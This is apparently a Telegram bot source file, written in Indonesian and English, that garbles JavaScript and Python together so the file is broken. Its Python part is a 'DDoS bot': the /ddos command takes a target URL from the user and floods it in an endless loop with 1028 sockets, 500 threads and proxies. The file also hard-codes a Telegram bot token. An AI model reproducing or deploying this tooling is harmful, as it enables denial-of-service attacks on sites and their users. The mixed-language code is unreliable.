import DDos
import telebot


const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Ganti dengan token bot Telegram Anda
const token = '7069670027:AAGrM4SX8wAyoFmZpKQQo83qS3aANewmleI';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Aktivitas Penggunaan Bot Telegram`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'Tidak ada'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Perintah: ${command}`);
}

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {

  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);

  // Menanggapi perintah /mix
  if (command.startsWith('/mix')) {


  @bot.message_handler(commands=['start'])
def start (message):
    bot.reply_to(message, "Hi sir , type /help")

@bot.message_handler(commands=['help'])
def help (message):
    bot.send_message(message.chat.id, "welcome to Akyra ddos bot:\n /ddos - start a ddos attack \n /help - all command \n /author - author of bot")

@bot.message_handler(commands=['ddos'])
def ddosa (message):
    msg = bot.send_message(message.chat.id, "target :!")
    bot.register_next_step_handler(msg, ddoss)
def ddoss (message):
  url = message.text
  bot.send_message(message.chat.id, "attack started")
  while True:
    DDos.DDos(url, sockets = 1028, threads = 500, use_proxies = True)
   
# Команда /author
@bot.message_handler(commands=['author'])
def author (message):
  bot.send_message(message.chat.id, "@SpidiFarish and 0xSn1kky =)")
  
bot.polling(none_stop=True, interval=0)

    
    
  }
});
